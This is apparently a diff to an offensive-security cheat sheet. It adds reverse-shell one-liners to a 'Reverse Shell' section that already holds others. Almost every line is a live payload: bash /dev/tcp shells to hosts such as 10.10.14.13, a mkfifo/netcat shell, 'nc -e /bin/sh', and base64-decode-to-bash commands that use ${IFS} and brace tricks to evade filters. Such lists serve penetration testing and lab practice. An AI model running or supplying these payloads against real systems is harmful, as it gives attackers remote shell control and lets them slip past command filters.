@@ -23,7 +23,13 @@ nc -lvnp 4444
 bash -i >& /dev/tcp/10.10.14.13/4444 0>&1
 0<&196;exec 196<>/dev/tcp/10.10.14.13/4444; sh <&196 >&196 2>&196
 /bin/bash -l > /dev/tcp/10.10.14.13/4444 0<&1 2>&1
-
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.21.0.0 1234 >/tmp/f
+nc -e /bin/sh 10.11.1.111 4443
+bash -i >& /dev/tcp/IP ADDRESS/8080 0>&1
+{echo,COMMAND_BASE64}|{base64,-d}|bash 
+echo${IFS}COMMAND_BASE64|base64${IFS}-d|bash
+bash -c {echo,COMMAND_BASE64}|{base64,-d}|{bash,-i} 
+echo COMMAND_BASE64 | base64 -d | bash 
 ```
 ## 🎃 Meterpreter Shells
 
